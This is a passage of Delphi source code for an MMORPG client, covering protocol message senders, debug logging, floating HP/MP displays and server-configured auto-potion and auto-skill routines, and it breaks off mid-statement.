Procedure TfrmMain.SendHeroEat(itmindex: integer; itmname: String);
Var
  msg: TDefaultMessage;
Begin
  Try //程序自动增加
    msg := MakeDefaultMsg(CM_1104, itmindex, 0, 0, 0);
    SendSocket(EncodeMessage(msg) + EncodeString(itmname));
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendHeroEat'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendHeroAllowJoint();
Var
  msg: TDefaultMessage;
Begin
  Try //程序自动增加
    msg := MakeDefaultMsg(CM_1108, 0, 0, 0, 0);
    SendSocket(EncodeMessage(msg));
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendHeroAllowJoint'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendViewDelHum();
Var
  msg: TDefaultMessage;
Begin
  Try //程序自动增加
    msg := MakeDefaultMsg(CM_VIEWDELHUM, 0, 0, 0, 0);
    SendSocket(EncodeMessage(msg));
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendViewDelHum'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendRenewHum(sName: String);
Var
  msg: TDefaultMessage;
Begin
  Try //程序自动增加
    msg := MakeDefaultMsg(CM_RENEWHUM, 0, 0, 0, 0);
    SendSocket(EncodeMessage(msg) + EncodeString(sName));
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendRenewHum'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendTaxis(nIdx, nJob, nPage: Integer);
Var
  msg: TDefaultMessage;
Begin
  Try //程序自动增加
    msg := MakeDefaultMsg(CM_TAXIS, nIdx, nJob, nPage, 0);
    SendSocket(EncodeMessage(msg));
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendTaxis'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendSellOffGetList(nIdx, nPage, nFind: Integer; sMsg:
  String);
Var
  msg: TDefaultMessage;
Begin
  Try //程序自动增加
    msg := MakeDefaultMsg(CM_SELLOFFITEMLIST, 0, nIdx, nPage, nFind);
    If (sMsg = '') Or (nFind <> 1) Then
      SendSocket(EncodeMessage(msg))
    Else
      SendSocket(EncodeMessage(msg) + EncodeString(sMsg));
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendSellOffGetList'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendSellOffBuy(nItemIndex: Integer);
Var
  msg: TDefaultMessage;
Begin
  Try //程序自动增加
    msg := MakeDefaultMsg(CM_SELLOFFBUY, nItemIndex, 0, 0, 0);
    SendSocket(EncodeMessage(msg))
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendSellOffBuy'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendLevelItem(Idx, bijouIdx, bijou2Idx: integer);
Var
  msg: TDefaultMessage;
Begin
  Try //程序自动增加
    msg := MakeDefaultMsg(CM_LEVELITEM, Idx, LoWord(bijouIdx), HiWord(bijouIdx),
      0);
    If bijou2Idx = 0 Then
      SendSocket(EncodeMessage(msg))
    Else
      SendSocket(EncodeMessage(msg) + EncodeString(IntToStr(bijou2Idx)));
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendLevelItem'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendOpenGetItem();
Var
  msg: TDefaultMessage;
Begin
  msg := MakeDefaultMsg(CM_OPENARKITEM, 0, 0, 0, 0);
  SendSocket(EncodeMessage(msg));
End;

Procedure TfrmMain.SendOpenMove();
Var
  msg: TDefaultMessage;
Begin
  msg := MakeDefaultMsg(CM_OPENARKMOVE, 0, 0, 0, 0);
  SendSocket(EncodeMessage(msg));
End;

Procedure TfrmMain.SendOpenArk(ArkIdx, KeyIdx: integer);
Var
  msg: TDefaultMessage;
Begin
  Try //程序自动增加
    msg := MakeDefaultMsg(CM_OPENARKEX, ArkIdx, LoWord(KeyIdx), HiWord(KeyIdx),
      0);
    SendSocket(EncodeMessage(msg));
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendOpenArk'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendHeroWatch(boWatch: Boolean);
Var
  msg: TDefaultMessage;
  idx, Redcogid: Integer;
Begin
  Try //程序自动增加
    If g_FocusCret <> Nil Then
      Redcogid := g_FocusCret.m_nRecogId
    Else
      Redcogid := 0;
    If boWatch Then
      idx := 1
    Else
      idx := 0;
    msg := MakeDefaultMsg(CM_1105, Redcogid, g_nMouseCurrX, g_nMouseCurrY, idx);
    SendSocket(EncodeMessage(msg));
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendHeroWatch'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendCloseShopItems();
Var
  msg: TDefaultMessage;
Begin
  Try //程序自动增加
    If g_MySelf <> Nil Then
    Begin
      g_MySelf.m_boIsShop := False;
      msg := MakeDefaultMsg(CM_SELFCLOSESHOP, 0, 0, 0, 0);
      SendSocket(EncodeMessage(msg));
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendCloseShopItems'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendSelfShopBuy(ActorIdx, nX, nY, sItemidx: Integer);
Var
  msg: TDefaultMessage;
Begin
  Try //程序自动增加
    msg := MakeDefaultMsg(CM_SELFSHOPBUY, ActorIdx, nX, nY, 0);
    SendSocket(EncodeMessage(msg) + EncodeString(IntToStr(sItemidx)));
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendSelfShopBuy'); //程序自动增加
  End; //程序自动增加
End;

procedure TfrmMain.SendMakeWine();
Var
  i: integer;
  ClientWineItem:TUserWineItem;
  msg: TDefaultMessage;
  sMsg: String;
begin
    If g_MySelf <> Nil Then
    Begin
      sMsg := '';
    case g_MakeWineidx of
      0:
      begin
        for I := Low(g_WineItem) to High(g_WineItem) do
        Begin
         If g_WineItem[I].S.Name <> '' Then
         Begin
           FillChar(ClientWineItem, SizeOf(TUserWineItem), #0);
           ClientWineItem.MakeIndex:=g_WineItem[I].MakeIndex;
           ClientWineItem.idx:=i;
           sMsg := sMsg + EncodeBuffer(@ClientWineItem, SizeOf(TUserWineItem))+ '/';
         End;
        End;
        FillChar(g_WineItem, Sizeof(TClientItem) * 7, #0);
      end;
      1:
      begin
        for I := Low(g_WineItem1) to High(g_WineItem1) do
        Begin
          If g_WineItem1[I].S.Name <> '' Then
          Begin
           FillChar(ClientWineItem, SizeOf(TUserWineItem), #0);
           ClientWineItem.MakeIndex:=g_WineItem1[I].MakeIndex;
           ClientWineItem.idx:=i;
            sMsg := sMsg + EncodeBuffer(@ClientWineItem, SizeOf(TUserWineItem))+ '/';
          End;
        End;
        FillChar(g_WineItem1, Sizeof(TClientItem) * 3, #0);
      end;
    end;
       msg := MakeDefaultMsg(CM_MakeWineItems,g_MakeWineidx, 0, 0, 0);
      SendSocket(EncodeMessage(msg) + sMsg);
    End;
end;

Procedure TfrmMain.SendShopItems(sTitle: String);
Var
  i: integer;
  //  ShopItem:TShopItem;
  ClientShopItem: TClientShopItem;
  msg: TDefaultMessage;
  sMsg: String;
Begin
  Try //程序自动增加
    If g_MySelf <> Nil Then
    Begin
      g_MySelf.m_boIsShop := True;
      g_MySelf.m_sShopMsg := sTitle;
      sMsg := EncodeString(sTitle) + '/';
      For i := Low(g_ShopItems) To High(g_ShopItems) Do
      Begin
        If g_ShopItems[I].Item.S.Name <> '' Then
        Begin
          FillChar(ClientShopItem, SizeOf(TClientShopItem), #0);
          ClientShopItem.nItemIdx := g_ShopItems[I].Item.MakeIndex;
          ClientShopItem.nPic := g_ShopItems[I].nPic;
          ClientShopItem.boCls := g_ShopItems[I].boCls;
          sMsg := sMsg + EncodeBuffer(@ClientShopItem, SizeOf(TClientShopItem))+'/';
        End;
      End;
      msg := MakeDefaultMsg(CM_SELFSHOPITEMS, 0, 0, 0, 0);
      SendSocket(EncodeMessage(msg) + sMsg);
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendShopItems'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendHeroDropItem(name: String; itemserverindex: integer);
Var
  msg: TDefaultMessage;
Begin
  Try //程序自动增加
    msg := MakeDefaultMsg(CM_1106, itemserverindex, 0, 0, 0);
    SendSocket(EncodeMessage(msg) + EncodeString(name));
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendHeroDropItem'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SetInputStatus;
Begin
  Try //程序自动增加
    If m_boPasswordIntputStatus Then
    Begin
      m_boPasswordIntputStatus := False;
      PlayScene.EdChat.PasswordChar := #0;
      PlayScene.EdChat.Visible := False;
    End
    Else
    Begin
      m_boPasswordIntputStatus := True;
      PlayScene.EdChat.PasswordChar := '*';
      PlayScene.EdChat.Visible := True;
      PlayScene.EdChat.SetFocus;
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SetInputStatus'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ClientGetServerConfig(Msg: TDefaultMessage; sBody: String);
Begin
  Try //程序自动增加
    DecodeBuffer(sBody, @g_ClientWgInfo, SizeOf(TClientWGInfo));
    If Assigned(FormWgMain) Then
    Begin
      FormWgMain.MoveTime.Max := g_ClientWgInfo.nMoveTime;
      FormWgMain.HitTime.Max := g_ClientWgInfo.nHitTime;
      FormWgMain.SpellTime.Max := g_ClientWgInfo.nSpellTime;
      FormWgMain.MoveTime.Position := _MIN(FormWgMain.MoveTime.Max,
        FormWgMain.MoveTime.Position);
      FormWgMain.HitTime.Position := _MIN(FormWgMain.HitTime.Max,
        FormWgMain.HitTime.Position);
      FormWgMain.SpellTime.Position := _MIN(FormWgMain.SpellTime.Max,
        FormWgMain.SpellTime.Position);
    End;
    //if not g_boUseDIBSurface then
    g_boForceNotViewFog := g_ClientWgInfo.boForceNotViewFog;
    g_boCanStartRun := g_ClientWgInfo.boCanStartRun;

    If Msg.Param > 0 Then
      g_HeroEatingTime := msg.Param;
    If Msg.Tag > 0 Then
      g_AutoPuckUpItemTime := msg.Tag;
    If Msg.Series > 0 Then
      g_AspeederTime := Msg.Series;
    //g_DeathColorEffect:=TColorEffect( _MIN(LoByte(msg.Param),8) );
    //g_boCanRunHuman:=LoByte(LoWord(msg.Recog)) = 1;
    //g_boCanRunMon:=HiByte(LoWord(msg.Recog)) = 1;
    //g_boCanRunNpc:=LoByte(HiWord(msg.Recog)) = 1;
    //g_boCanRunAllInWarZone:=HiByte(HiWord(msg.Recog)) = 1;
    {
    DScreen.AddChatBoardString ('g_boCanRunHuman ' + BoolToStr(g_boCanRunHuman),clWhite, clRed);
    DScreen.AddChatBoardString ('g_boCanRunMon ' + BoolToStr(g_boCanRunMon),clWhite, clRed);
    DScreen.AddChatBoardString ('g_boCanRunNpc ' + BoolToStr(g_boCanRunNpc),clWhite, clRed);
    DScreen.AddChatBoardString ('g_boCanRunAllInWarZone ' + BoolToStr(g_boCanRunAllInWarZone),clWhite, clRed);
    }
    //sBody:=DecodeString(sBody);
    //DecodeBuffer(sBody,@ClientConf,SizeOf(ClientConf));
    //g_boCanRunHuman        :=ClientConf.boRunHuman;
    //g_boCanRunMon          :=ClientConf.boRunMon;
    //g_boCanRunNpc          :=ClientConf.boRunNpc;
    //g_boCanRunAllInWarZone :=ClientConf.boWarRunAll;
    //g_DeathColorEffect     :=TColorEffect(_MIN(8,ClientConf.btDieColor));
    //g_nHitTime             :=ClientConf.wHitIime;
    //g_dwSpellTime          :=ClientConf.wSpellTime;
    //g_nItemSpeed           :=ClientConf.btItemSpeed;
    //g_boCanStartRun        :=ClientConf.boCanStartRun;
    //g_wginfo.boParalyCanRun     :=ClientConf.boParalyCanRun;
    //g_wginfo.boParalyCanWalk    :=ClientConf.boParalyCanWalk;
    //g_wginfo.boParalyCanHit     :=ClientConf.boParalyCanHit;
    //g_wginfo.boParalyCanSpell   :=ClientConf.boParalyCanSpell;
    //g_boShowRedHPLable     :=ClientConf.boShowRedHPLable;
    //g_boShowHPNumber       :=ClientConf.boShowHPNumber;
    //g_boShowJobLevel       :=ClientConf.boShowJobLevel;
    //g_boDuraAlert          :=ClientConf.boDuraAlert;
    //g_boMagicLock          :=ClientConf.boMagicLock;
    //g_boAutoPuckUpItem     :=ClientConf.boAutoPuckUpItem;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientGetServerConfig');
    //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ProcessCommand(sData: String);
Var
  sCmd, sParam1, sParam2, sParam3, sParam4, sParam5: String;
Begin
  Try //程序自动增加
    sData := GetValidStr3(sData, sCmd, [' ', ':', #9]);
    sData := GetValidStr3(sData, sCmd, [' ', ':', #9]);
    sData := GetValidStr3(sData, sParam1, [' ', ':', #9]);
    sData := GetValidStr3(sData, sParam2, [' ', ':', #9]);
    sData := GetValidStr3(sData, sParam3, [' ', ':', #9]);
    sData := GetValidStr3(sData, sParam4, [' ', ':', #9]);
    sData := GetValidStr3(sData, sParam5, [' ', ':', #9]);

    If CompareText(sCmd, 'ShowHumanMsg') = 0 Then
    Begin
      CmdShowHumanMsg(sParam1, sParam2, sParam3, sParam4, sParam5);
      exit;
    End;
    {
    g_boShowMemoLog:=not g_boShowMemoLog;
    PlayScene.MemoLog.Clear;
    PlayScene.MemoLog.Visible:=g_boShowMemoLog;
    }
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ProcessCommand'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.CmdShowHumanMsg(sParam1, sParam2, sParam3, sParam4, sParam5:
  String);
Var
  sHumanName: String;
Begin
  Try //程序自动增加
    sHumanName := sParam1;
    If (sHumanName <> '') And (sHumanName[1] = 'C') Then
    Begin
      PlayScene.MemoLog.Clear;
      exit;
    End;

    If sHumanName <> '' Then
    Begin
      ShowMsgActor := PlayScene.FindActor(sHumanName);
      If ShowMsgActor = Nil Then
      Begin
        DScreen.AddChatBoardString(format('%s没找到！！！', [sHumanName]),
          clWhite, clRed);
        exit;
      End;
    End;
    g_boShowMemoLog := Not g_boShowMemoLog;
    PlayScene.MemoLog.Clear;
    PlayScene.MemoLog.Visible := g_boShowMemoLog;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.CmdShowHumanMsg'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ShowHumanMsg(Msg: pTDefaultMessage);
  Function GetIdent(nIdent: Integer): String;
  Begin
    Case nIdent Of
      SM_RUSH: Result := 'SM_RUSH';
      SM_RUSHKUNG: Result := 'SM_RUSHKUNG';
      SM_FIREHIT: Result := 'SM_FIREHIT';
      SM_BACKSTEP: Result := 'SM_BACKSTEP';
      SM_TURN: Result := 'SM_TURN';
      SM_WALK: Result := 'SM_WALK';
      SM_SITDOWN: Result := 'SM_SITDOWN';
      SM_RUN: Result := 'SM_RUN';
      SM_HIT: Result := 'SM_HIT';
      SM_HEAVYHIT: Result := 'SM_HEAVYHIT';
      SM_BIGHIT: Result := 'SM_BIGHIT';
      SM_SPELL: Result := 'SM_SPELL';
      SM_POWERHIT: Result := 'SM_POWERHIT';
      SM_LONGHIT: Result := 'SM_LONGHIT';
      SM_DIGUP: Result := 'SM_DIGUP';
      SM_DIGDOWN: Result := 'SM_DIGDOWN';
      SM_FLYAXE: Result := 'SM_FLYAXE';
      SM_LIGHTING: Result := 'SM_LIGHTING';
      SM_WIDEHIT: Result := 'SM_WIDEHIT';
      SM_ALIVE: Result := 'SM_ALIVE';
      SM_MOVEFAIL: Result := 'SM_MOVEFAIL';
      SM_HIDE: Result := 'SM_HIDE';
      SM_DISAPPEAR: Result := 'SM_DISAPPEAR';
      SM_STRUCK: Result := 'SM_STRUCK';
      SM_DEATH: Result := 'SM_DEATH';
      SM_SKELETON: Result := 'SM_SKELETON';
      SM_NOWDEATH: Result := 'SM_NOWDEATH';
      SM_CRSHIT: Result := 'SM_CRSHIT';
      SM_TWINHIT: Result := 'SM_TWINHIT';
      SM_LONGSWORD1: Result := 'SM_LONGSWORD1';
      SM_LONGSWORD2: Result := 'SM_LONGSWORD2';
      SM_LONGFIREHIT: Result := 'SM_LONGFIREHIT';
      SM_FIREHIT2: Result := 'SM_FIREHIT2';
      SM_HEAR: Result := 'SM_HEAR';
      SM_FEATURECHANGED: Result := 'SM_FEATURECHANGED';
      SM_USERNAME: Result := 'SM_USERNAME';
      SM_WINEXP: Result := 'SM_WINEXP';
      SM_LEVELUP: Result := 'SM_LEVELUP';
      SM_DAYCHANGING: Result := 'SM_DAYCHANGING';
      SM_ITEMSHOW: Result := 'SM_ITEMSHOW';
      SM_ITEMHIDE: Result := 'SM_ITEMHIDE';
      SM_MAGICFIRE: Result := 'SM_MAGICFIRE';
      SM_CHANGENAMECOLOR: Result := 'SM_CHANGENAMECOLOR';
      SM_CHARSTATUSCHANGED: Result := 'SM_CHARSTATUSCHANGED';

      SM_SPACEMOVE_HIDE: Result := 'SM_SPACEMOVE_HIDE';
      SM_SPACEMOVE_SHOW: Result := 'SM_SPACEMOVE_SHOW';
      SM_SHOWEVENT: Result := 'SM_SHOWEVENT';
      SM_HIDEEVENT: Result := 'SM_HIDEEVENT';
    Else
      Result := IntToStr(nIdent);
    End;
  End;
Var
  sLineText: String;

Begin
  Try //程序自动增加
    If (ShowMsgActor = Nil) Or (ShowMsgActor <> Nil) And (ShowMsgActor.m_nRecogId
      = Msg.Recog) Then
    Begin
      sLineText := format('ID:%d Ident:%s', [Msg.Recog, GetIdent(Msg.Ident)]);
      PlayScene.MemoLog.Lines.Add(sLineText);
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ShowHumanMsg'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ClientGetMonMoveHMShow(Actor: TActor; Param, nTag: Word;
  boDis: Boolean);
Var
  MoveShow: pTMoveHMShow;
  str: String;
  i: integer;
  Tag: Word;
Begin
  Try //程序自动增加
    If (Actor = Nil) Or (actor.m_btRace = 50) Then
      exit;
    If (Not g_wgInfo.boMoveRedShow) Or (Not g_ClientWgInfo.boMoveRedShow) Then
      exit;
    If Actor.m_Abil.MaxHP = 0 Then
      Tag := nTag
    Else
      Tag := Actor.m_Abil.HP;
    With Actor Do
    Begin
      If boDis Then
      Begin
        New(MoveShow);
        MoveShow.boMoveHpShow := True;
        MoveShow.nMoveHpCount := 0;
        MoveShow.nMoveHpEnd := 0;
        MoveShow.nMoveHpList[0] := 61;
        m_nMoveHpList.Add(MoveShow);
      End
      Else If Param <> Tag Then
      Begin
        New(MoveShow);
        If Param < Tag Then
        Begin
          MoveShow.nMoveHpList[0] := 15;
          str := IntToStr(Tag - Param);
        End
        Else
        Begin
          MoveShow.nMoveHpList[0] := 16;
          str := IntToStr(Param - Tag);
        End;
        MoveShow.boMoveHpShow := True;
        MoveShow.nMoveHpCount := 0;
        MoveShow.nMoveHpEnd := 0;
        For I := 1 To Length(str) Do
        Begin
          Inc(MoveShow.nMoveHpCount);
          MoveShow.nMoveHpList[I] := 5 + StrToInt(Str[I]);
        End;
        m_nMoveHpList.Add(MoveShow);
      End
      Else If (Param = Tag) And (Tag <> 0) Then
      Begin
        New(MoveShow);
        MoveShow.boMoveHpShow := True;
        MoveShow.nMoveHpCount := 0;
        MoveShow.nMoveHpEnd := 0;
        MoveShow.nMoveHpList[0] := 41;
        m_nMoveHpList.Add(MoveShow);
      End;
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientGetMonMoveHMShow');
    //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ClientGetMoveHMShow(Actor: TActor; Param, Tag: Word);
Var
  MoveShow: pTMoveHMShow;
  str: String;
  i: integer;
Begin
  Try //程序自动增加
    If (Actor = Nil) Or (actor.m_btRace = 50) Then
      exit;
    If (Not g_wgInfo.boMoveRedShow) Or (Not g_ClientWgInfo.boMoveRedShow) Then
      exit;
    With Actor Do
    Begin
      If m_Abil.HP <> Param Then
      Begin
        New(MoveShow);
        If m_Abil.HP < Param Then
        Begin
          MoveShow.nMoveHpList[0] := 16;
          str := IntToStr(Param - m_Abil.HP);
        End
        Else
        Begin
          MoveShow.nMoveHpList[0] := 15;
          str := IntToStr(m_Abil.HP - Param);
        End;
        MoveShow.boMoveHpShow := True;
        MoveShow.nMoveHpCount := 0;
        MoveShow.nMoveHpEnd := 0;
        For I := 1 To Length(str) Do
        Begin
          Inc(MoveShow.nMoveHpCount);
          MoveShow.nMoveHpList[I] := 5 + StrToInt(Str[I]);
        End;
        m_nMoveHpList.Add(MoveShow);
      End
      Else If m_Abil.MP <> Tag Then
      Begin
        If m_Abil.MaxMP > 0 Then
        Begin
          New(MoveShow);
          If m_Abil.MP < Tag Then
          Begin
            MoveShow.nMoveHpList[0] := 28;
            str := IntToStr(Tag - m_Abil.MP);
          End
          Else
          Begin
            MoveShow.nMoveHpList[0] := 27;
            str := IntToStr(m_Abil.MP - Tag);
          End;
          MoveShow.boMoveHpShow := True;
          MoveShow.nMoveHpCount := 0;
          MoveShow.nMoveHpEnd := 0;
          For I := 1 To Length(str) Do
          Begin
            Inc(MoveShow.nMoveHpCount);
            MoveShow.nMoveHpList[I] := 17 + StrToInt(Str[I]);
          End;
          m_nMoveHpList.Add(MoveShow);
        End;
      End
      Else If (m_Abil.HP = Param) And (m_Abil.HP <> m_Abil.MaxHP) Then
      Begin
        New(MoveShow);
        MoveShow.boMoveHpShow := True;
        MoveShow.nMoveHpCount := 0;
        MoveShow.nMoveHpEnd := 0;
        MoveShow.nMoveHpList[0] := 41;
        m_nMoveHpList.Add(MoveShow);
      End;
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientGetMoveHMShow'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.WindowsMediaPlayer1PlayStateChange(ASender: TObject;
  NewState: Integer);
Begin
  //DScreen.AddHitMsg(IntTOStr(NewState));
  If (NewState = 1) And (g_boBGSound) And (g_boBGSoundCLose) Then
    WindowsMediaPlayer1.controls.play;
End;

(*Function  ClearWg2(nHandle:THandle;myIdx:Integer):Bool;stdcall;
var
  sClassname:array[0..255] of Char;
begin
  Result:=True;
  GetWindowTextA(nHandle,@sClassname,SizeOf(sClassname)-1);
  //ShowMessage(String(sClassname)+'|'+g_ClearWg2);
  if CompareLStr(sClassname,g_ClearWg2,Length(g_ClearWg2)) then begin
    Result:=False;
  end;
end;

Function  ClearWg(nHandle:THandle;myIdx:Integer):Bool;stdcall;
var
  sClassname:array[0..255] of Char;
{$IF WINDOPROCESS  = OPENPROCESS}
  sname:array[0..255] of Char;
  I:integer;
{$IFEND}
  sKey:String;
begin
  Result:=True;
  GetClassNameA(nHandle,@sClassname,SizeOf(sClassname)-1);
  if CompareLStr(sClassname,g_ClearWg,Length(g_ClearWg)) then begin
    if not EnumChildWindows(nHandle,@ClearWg2,100) then begin
      FrmMain.CSocket.Socket.Close;
      FrmDlg.DMessageDlg (FrmMain.Server.DecryptStr('Bh=+xvSnIE6J8VC4VZ2dvfppS2PlER=Frxu5My2Dq4MBdYT24t4VuomYgwWJzOZFjpJsGglG0Vg6Ufo8dv+wAbRjklNe7dOEXxCKuf6PHKetqhBrRDdTrhaQBDXtbMIz'), [mbOk]);
      FrmMain.Close;
      Result:=False;
    end;;

{$IF WINDOPROCESS  = OPENPROCESS}
  {end else begin
    GetWindowTextA(nHandle,@sname,SizeOf(sname)-1);
    for i:=0 to m_TitleList.Count -1 do begin
      if AnsiContainsText(sname,m_TitleList.Strings[I]) then begin
        FrmMain.CSocket.Socket.Close;
        FrmDlg.DMessageDlg (FrmMain.Server.DecryptStr('Bh=+xvSnIE6J8VC4VZ2dvfppS2PlER=Frxu5My2Dq4MBdYT24t4VuomYgwWJzOZFjpJsGglG0Vg6Ufo8dv+wAbRjklNe7dOEXxCKuf6PHKetqhBrRDdTrhaQBDXtbMIz'), [mbOk]);
        FrmMain.Close;
        Result:=False;
      end;
    end;
    //AnsiContainsText(sMsg,sFilterText)   }
  end;
{$ELSE}
  end;
{$IFEND}
end;    *)

Procedure TfrmMain.WgTimerTimer(Sender: TObject);
Resourcestring
  sTest = '你的[%s]已经用完。';
Var
  I, II: integer;
  SendStr: String;
Begin
  If (g_MySelf = Nil) Then
    exit;
  Try
    If g_boInetStr Then
    Begin
      If Length(g_InetStr) > 3000 Then
      Begin
        SendStr := Copy(g_InetStr, 1, 3000);
        g_InetStr := Copy(g_InetStr, 3000 + 1, Length(g_InetStr) - 3000);
      End
      Else
      Begin
        SendStr := g_InetStr;
        g_InetStr := '';
        g_boInetStr := False;
      End;
      If SendStr <> '' Then
        SendGuildUpdateNotice(SendStr, 2 - Integer(g_boInetStr));
    End;
  Except
  End;
  {$IF OEMVER   = 0}
  If (g_WgClass = 0) Then
    exit;
  {$IFEND}
  If g_WgClass = 1 Then
  Begin
    //自动保护
    Try
      If (g_WgInfo.boAutoHpProtect) And
        (g_MySelf.m_Abil.HP < g_WgInfo.boAutoHpProtectCount) And
        ((GetTickCount - g_dwAutoHpOrotectTick) > g_wgInfo.boAutoHpOrotectTick)
          Then
      Begin
        g_dwAutoHpOrotectTick := GetTickCount;
        II := GetItembyName(g_wgInfo.boAutoHpProtectName);
        If II > -1 Then
          FrmMain.EatItem(II)
        Else
        Begin
          pAutoOpenItem(g_wgInfo.boAutoHpProtectName);
          II := GetItembyName(g_wgInfo.boAutoHpProtectName);
          If II > -1 Then
            FrmMain.EatItem(II)
          Else
            DScreen.AddHitMsg(Format(sTest, [g_wgInfo.boAutoHpProtectName]));
        End;
      End;
    Except
    End;
    //自动补红2
    Try
      If (g_WgInfo.boAutoCropsHp) And
        (g_MySelf.m_Abil.HP < g_WgInfo.boAutoCropsHpCount) And
        ((GetTickCount - g_dwAutoCropsHpTick) > g_wgInfo.boAutoCropsHpTick) Then
      Begin
        g_dwAutoCropsHpTick := GetTickCount;
        if PlayEatItem(g_wgInfo.boAutoCropsHpName,3)=-1 then
          DScreen.AddHitMsg(Format(sTest, ['特殊药品']));
      End;
    Except
    End;
    //自动补红
    Try
      If (g_WgInfo.boAutoHp) And
        (g_MySelf.m_Abil.HP < g_WgInfo.boAutoHpCount) And
        ((GetTickCount - g_dwAutoHpTick) > g_wgInfo.boAutoHpTick) Then
      Begin
        g_dwAutoHpTick := GetTickCount;
        if PlayEatItem(g_wgInfo.boAutoHpName,1)=-1 then
           DScreen.AddHitMsg(Format(sTest, ['普通HP类药品']));
      End;
    Except
    End;
    //自动补蓝
    Try
      If (g_WgInfo.boAutoMp) And
        (g_MySelf.m_Abil.MP < g_WgInfo.boAutoMpCount) And
        ((GetTickCount - g_dwAutoMpTick) > g_wgInfo.boAutoMpTick) Then
      Begin
        g_dwAutoMpTick := GetTickCount;
        if PlayEatItem(g_wgInfo.boAutoMpName,2)=-1 then
            DScreen.AddHitMsg(Format(sTest, ['普通MP类药品']));
      End;
    Except
    End;
    //自动练功
    Try
      If (g_wginfo.boAutoMagic) And
        (g_ClientWgInfo.boAutoMagic) And
        (g_MySelf <> Nil) And
        (g_WgInfo.sAutoMagicName<>'') And
        (g_WgInfo.nAutoMagicIdx<>0) and
        (g_MySelf.m_Abil.MP > 10) And
        ((GetTickCount - g_dwAutoMagicTick) > g_wgInfo.nAutoMagicTime) Then
      Begin
         FrmMain.UseMagic(g_nMouseX, g_nMouseY, g_MyMagic[g_WgInfo.nAutoMagicIdx]);
        g_dwAutoMagicTick := GetTickCount;
      End;
    Except
    End;
  //自动逐日剑法
    if (g_WgInfo.boCanAutoLongFire) and
      (not g_MySelf.m_boIsShop) and
      (g_MySelf.m_btHorse = 0) and
      (not g_boNextTimeFireHit) and
      (g_MyMagic[73] <> nil) then
    begin
      if g_dwLongFireTick = 0 then
        g_dwLongFireTick := GetTickCount;
      if (GetTickCount - g_dwLongFireTick) >g_ClientWgInfo.nLongFireHitSkillTime then
      begin
        FrmMain.SendSpellMsg(CM_SPELL, g_MySelf.m_btDir, 0, 73, 0);
        g_dwLongFireTick := 0;
      end;
    end;

  //自动酒气护体
    if (g_WgInfo.boBacchusprotect) and
      (not g_MySelf.m_boIsShop) and
      (g_MySelf.m_btHorse = 0) and
      (g_MyMagic[84] <> nil) and (g_MySelf.m_WineRec.Alcoho>0) then
    begin
      if (GetTickCount - g_dwHPUpUseTime) >(g_ClientWgInfo.nHPUpUseTime*1000) then
      begin
        FrmMain.UseMagic(g_nMouseX, g_nMouseY, g_MyMagic[84]);
        g_dwHPUpUseTime := GetTickCount;
      end;
    end;

    //人物自动饮酒
    Try
      If (g_WgInfo.boAutoDrink) And ((g_MySelf.m_WineRec.Alcoho<=0) or
        (Round(g_MySelf.m_WineRec.Alcoho / g_MySelf.m_WineRec.WineValue*100)<
        g_WgInfo.boAutoDrinkCount)) and ((GetTickCount-g_nAutoDrinkTick)>2000) Then
      Begin
         g_nAutoDrinkTick:= GetTickCount;
         ii:=GetDrinkItem;
         if ii<>-1 then
          FrmMain.EatItem(II);
      End;
    Except
    End;

    //英雄自动饮酒
    Try
      If (g_WgInfo.boHeroAutoDrink) And ((g_WineRec.Alcoho<=0) or
      (Round(g_WineRec.Alcoho/g_WineRec.WineValue*100)<g_WgInfo.boHeroAutoDrinkCount)) and
      ((GetTickCount-g_nHeroAutoDrinkTick)>2000) Then
      Begin
         g_nHeroAutoDrinkTick:= GetTickCount;
         ii:=GetHeroDrinkItem;
         if ii<>-1 then
           FrmMain.HeroEatItem(Ii);
      End;
    Except
    End


  End;

  //持久警告
  Try
    If (g_wginfo.boDuraAlert) And
      (g_MySelf <> Nil) And
      ((GetTickCount() - g_dwDuraAlertTick) > g_dwDuraAlertTime) Then
